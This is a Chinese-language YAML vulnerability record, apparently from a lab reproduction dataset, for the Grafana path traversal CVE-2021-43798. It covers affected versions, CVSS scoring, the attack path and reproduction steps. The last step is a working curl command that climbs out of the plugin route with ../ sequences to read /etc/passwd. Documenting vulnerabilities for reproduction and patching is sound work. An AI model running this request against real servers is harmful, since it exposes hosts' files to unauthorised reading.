id: VULN-2026-0001
cve: CVE-2021-43798
title: Grafana 插件静态资源路由路径穿越导致任意文件读取
component: Grafana 8.2.6
affected_versions:
- scheme: semver
  introduced: 8.0.0
  fixed: 8.0.7
  exclude: []
- scheme: semver
  introduced: 8.1.0
  fixed: 8.1.8
  exclude: []
- scheme: semver
  introduced: 8.2.0
  fixed: 8.2.7
  exclude: []
- scheme: semver
  introduced: 8.3.0
  fixed: 8.3.1
  exclude: []
cwe: CWE-22 路径穿越（Path Traversal）
cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
cvss_score: 7.5
severity: 高
attack_path:
- 1. 未授权访问 Grafana Web 入口 http://127.0.0.1:<LAB_PORT>/login，从响应头与登录页指纹确认组件为 Grafana
- 2. 利用 /public/plugins/<plugin>/ 静态资源路由可拼接 ../ 序列，绕过 Web 根目录限制
- 3. 读取 /etc/passwd 等任意可读文件，泄露主机账户/配置文件（仅机密性受影响，C:H I:N A:N）
preconditions:
- 网络可达 Grafana 3000 端口（本部署仅 127.0.0.1:<LAB_PORT>，容器端口只绑回环）
- 目标存在已安装插件（默认 alertlist 即可）且前置代理未做路径归一化
- 无需认证、无需用户交互（PR:N / UI:N）
repro_steps:
- cmd: curl -s -i http://127.0.0.1:<LAB_PORT>/login
  expect: HTTP 200，响应体含 Grafana 登录页特征
- cmd: curl -s --path-as-is http://127.0.0.1:<LAB_PORT>/public/plugins/alertlist/../../../../../../../../etc/passwd
  expect: HTTP 200，响应体含 root:x:0
